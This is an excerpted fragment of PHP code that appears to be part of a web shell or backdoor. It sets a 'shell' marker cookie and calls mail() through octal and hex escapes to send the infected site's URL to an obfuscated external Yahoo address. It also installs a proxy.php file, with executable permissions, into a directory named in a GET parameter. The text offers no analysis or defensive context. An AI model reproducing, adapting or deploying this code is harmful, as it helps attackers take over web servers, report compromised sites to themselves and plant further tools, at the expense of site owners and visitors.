...
$OSV = php_uname(s);
@setcookie("gny","shell",time()+3600*24*7);
if(eregi('Linux',$OSV))
{
...
$zv="\155ai\154"; $wi=$_SERVER["HTTP_HOST"].$_SERVER["REQUEST_URI"];
...
if (!isset($_COOKIE['gny'])){@$zv("l\x6f\x63\x61\x68\157\x73\164@\171\141\x68\157\157\056\x63o\155","$wi","$wi\n$cnt");}
...
<?php
		if ($_GET['install'] == 'yup') {
			if (is_writable($_GET['path'])) {
				...
				chmod($_GET['path'].'/proxy.php', 0755);
			}else{
				echo '<font color=red><b>Directory is not writable!</b><br></font>';
			}
		}
